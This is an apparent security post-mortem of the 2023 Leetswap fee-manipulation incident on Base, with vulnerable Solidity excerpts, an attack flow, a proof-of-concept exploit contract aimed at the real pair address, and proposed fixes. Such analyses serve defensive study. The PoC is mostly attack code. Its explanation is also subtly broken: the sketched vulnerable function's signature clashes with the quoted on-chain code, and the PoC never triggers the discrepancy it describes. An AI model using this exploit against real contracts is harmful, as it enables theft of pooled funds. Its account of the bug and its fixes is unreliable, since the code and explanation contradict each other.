# Leetswap Fee Manipulation Incident Analysis

## 1. Overview

| Field | Details |
|------|------|
| Project | Leetswap |
| Date | 2023-08-28 |
| Chain | Base |
| Loss | ~$630,000 USD |
| Attack Type | Tax Token Fee Manipulation |
| CWE | CWE-682 (Incorrect Calculation) |
| Attacker Address | `0x705f736145bb9d4a4a186f4595907b60815085c3` |
| Attack Contract | `0xea8f89f47f3d4293897b4fe8cb69b5c233b9f560` |
| Vulnerable Contract | `0x94dac4a3ce998143aa119c05460731da80ad90cf` (LeetSwap Pair) |
| Fork Block | 2,031,746 |

## 2. Vulnerable Code Analysis

Leetswap is a DEX deployed on the Base chain that implemented the `_transferFeesSupportingTaxTokens()` function to support tax tokens (fee-on-transfer tokens). This function used the difference in token balances before and after a transfer to calculate fees. An attacker was able to manipulate this mechanism to cause a discrepancy between pool reserves and actual balances.

```solidity
// Vulnerable pattern: balance dependency in tax token fee handling
contract LeetSwapPair {
    // Vulnerable: calculates actual fee from balance difference before/after transfer
    function _transferFeesSupportingTaxTokens(
        address token,
        address to,
        uint256 amount
    ) internal returns (uint256 actualAmount) {
        uint256 balanceBefore = IERC20(token).balanceOf(to);
        IERC20(token).transfer(to, amount);
        // Actual received amount = post-transfer balance - pre-transfer balance
        // Vulnerable: additional manipulation possible when recipient is a contract
        actualAmount = IERC20(token).balanceOf(to) - balanceBefore;
    }

    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external {
        // Tax token supported swap
        if (amount0Out > 0) {
            _transferFeesSupportingTaxTokens(token0, to, amount0Out);
        }
        if (amount1Out > 0) {
            _transferFeesSupportingTaxTokens(token1, to, amount1Out);
        }

        // Update reserves via sync call
        _update(
            IERC20(token0).balanceOf(address(this)),
            IERC20(token1).balanceOf(address(this)),
            reserve0, reserve1
        );
    }
}
```

**Vulnerability**: The approach used by `_transferFeesSupportingTaxTokens()` to measure actual received amounts after a token transfer can cause incorrect reserve updates due to the burn/redistribution mechanisms of tax tokens. The attacker manipulated axlUSDC so that after a `sync()` call, the reserves became inflated or deflated relative to the actual balances, allowing the attacker to realize a profit.

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: LeetSwapV2Pair.sol
    function _transferFeesSupportingTaxTokens(address token, uint256 amount)  // ❌

// ...

    function _update0(uint256 amount) internal {
        uint256 _protocolFeesShare = ILeetSwapV2Factory(factory)
            .protocolFeesShare();
        address _protocolFeesRecipient = ILeetSwapV2Factory(factory)
            .protocolFeesRecipient();
        uint256 _protocolFeesAmount = (amount * _protocolFeesShare) / 10000;
        amount = _transferFeesSupportingTaxTokens(  // ❌
            token0,
            amount - _protocolFeesAmount
        );
        if (_protocolFeesAmount > 0)
            _safeTransfer(token0, _protocolFeesRecipient, _protocolFeesAmount);
        uint256 _ratio = (amount * 1e18) / totalSupply;
        if (_ratio > 0) {
            index0 += _ratio;
        }
        emit Fees(msg.sender, amount, 0);
    }

// ...

    function _update1(uint256 amount) internal {
        uint256 _protocolFeesShare = ILeetSwapV2Factory(factory)
            .protocolFeesShare();
        address _protocolFeesRecipient = ILeetSwapV2Factory(factory)
            .protocolFeesRecipient();
        uint256 _protocolFeesAmount = (amount * _protocolFeesShare) / 10000;
        amount = _transferFeesSupportingTaxTokens(  // ❌
            token1,
            amount - _protocolFeesAmount
        );
        if (_protocolFeesAmount > 0)
            _safeTransfer(token1, _protocolFeesRecipient, _protocolFeesAmount);
        uint256 _ratio = (amount * 1e18) / totalSupply;
        if (_ratio > 0) {
            index1 += _ratio;
        }
        emit Fees(msg.sender, 0, amount);
    }
```

## 3. Attack Flow

```
Attacker [0x705f736145bb9d4a4a186f4595907b60815085c3]
  │
  ├─1─▶ Router.swapExactTokensForTokensSupportingFeeOnTransferTokens()
  │      WETH → axlUSDC swap
  │      [WETH: 0x4200000000000000000000000000000000000006]
  │      [axlUSDC: 0xEB466342C4d449BC9f53A865D5Cb90586f405215]
  │
  ├─2─▶ LeetSwapPair._transferFeesSupportingTaxTokens() called
  │      [LeetSwapPair: 0x94dac4a3ce998143aa119c05460731da80ad90cf]
  │      axlUSDC fee processing — triggers reserve/balance discrepancy
  │
  ├─3─▶ LeetSwapPair.sync()
  │      Force-updates reserves to current balances
  │      → Manipulates WETH/axlUSDC exchange rate
  │
  ├─4─▶ Router.swapExactTokensForTokensSupportingFeeOnTransferTokens()
  │      axlUSDC → WETH reverse swap
  │      Receives more WETH at the manipulated rate
  │
  └─5─▶ ~$630,000 profit realized
```

## 4. PoC Core Code

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

interface ILeetSwapPair {
    function sync() external;
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32);
}

interface ILeetSwapRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract LeetswapExploit {
    ILeetSwapPair pair = ILeetSwapPair(0x94dac4a3ce998143aa119c05460731da80ad90cf);
    ILeetSwapRouter router;
    IERC20 WETH = IERC20(0x4200000000000000000000000000000000000006);
    IERC20 axlUSDC = IERC20(0xEB466342C4d449BC9f53A865D5Cb90586f405215);

    function testExploit() external {
        // WETH → axlUSDC swap (triggers tax token fee processing)
        uint256 wethBalance = WETH.balanceOf(address(this));
        WETH.approve(address(router), wethBalance);

        address[] memory path1 = new address[](2);
        path1[0] = address(WETH);
        path1[1] = address(axlUSDC);

        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            wethBalance, 0, path1, address(this), block.timestamp
        );

        // Reserve discrepancy induced by _transferFeesSupportingTaxTokens vulnerability, then sync
        pair.sync();

        // Reverse swap at manipulated rate
        uint256 axlBalance = axlUSDC.balanceOf(address(this));
        axlUSDC.approve(address(router), axlBalance);

        address[] memory path2 = new address[](2);
        path2[0] = address(axlUSDC);
        path2[1] = address(WETH);

        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            axlBalance, 0, path2, address(this), block.timestamp
        );
    }
}
```

## 5. Vulnerability Classification

| Field | Details |
|------|------|
| CWE | CWE-682 (Incorrect Calculation) |
| Vulnerability Type | Tax token fee handling error, reserve discrepancy |
| Impact Scope | Leetswap WETH-axlUSDC liquidity pool |
| Explorer | [Basescan](https://basescan.org/address/0x94dac4a3ce998143aa119c05460731da80ad90cf) |

## 6. Security Recommendations

```solidity
// Fix 1: Validate reserve consistency before and after swap
function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external {
    (uint112 _reserve0, uint112 _reserve1,) = getReserves();
    uint256 balance0Before = IERC20(token0).balanceOf(address(this));
    uint256 balance1Before = IERC20(token1).balanceOf(address(this));

    if (amount0Out > 0) _transferFeesSupportingTaxTokens(token0, to, amount0Out);
    if (amount1Out > 0) _transferFeesSupportingTaxTokens(token1, to, amount1Out);

    uint256 balance0 = IERC20(token0).balanceOf(address(this));
    uint256 balance1 = IERC20(token1).balanceOf(address(this));

    // Verify post-transfer balance is at least reserve - amountOut
    require(balance0 >= _reserve0 - amount0Out, "Insufficient token0 output");
    require(balance1 >= _reserve1 - amount1Out, "Insufficient token1 output");

    _update(balance0, balance1, _reserve0, _reserve1);
}

// Fix 2: Tax token whitelist
mapping(address => bool) public isTaxToken;
mapping(address => bool) public isApprovedTaxToken;

function addLiquidity(address token0, address token1, ...) external {
    // Tax tokens require separate validation
    if (isTaxToken[token0] || isTaxToken[token1]) {
        require(isApprovedTaxToken[token0] && isApprovedTaxToken[token1],
            "Tax token not approved for this pool");
    }
    // ...
}

// Fix 3: Access control on sync()
function sync() external onlyOwner {
    _update(IERC20(token0).balanceOf(address(this)),
            IERC20(token1).balanceOf(address(this)), reserve0, reserve1);
}
```

## 7. Lessons Learned

1. **Complexity of tax token DEX integration**: Integrating fee-on-transfer tax tokens into an AMM requires special handling such as `_transferFeesSupportingTaxTokens()`, but this handling itself becomes a new attack vector.
2. **Base chain DEX vulnerabilities**: As Base is a nascent ecosystem, unaudited DEX implementations are being deployed. DEXes on new chains require especially thorough audits.
3. **Risk of publicly callable sync()**: If an AMM's `sync()` function can be called by anyone, it can be used to arbitrarily update reserves and manipulate prices. Access control or call condition restrictions are necessary.
4. **Post-swap balance validation**: Immediately verifying any discrepancy between reserves and actual balances after a swap is executed can block this class of attack.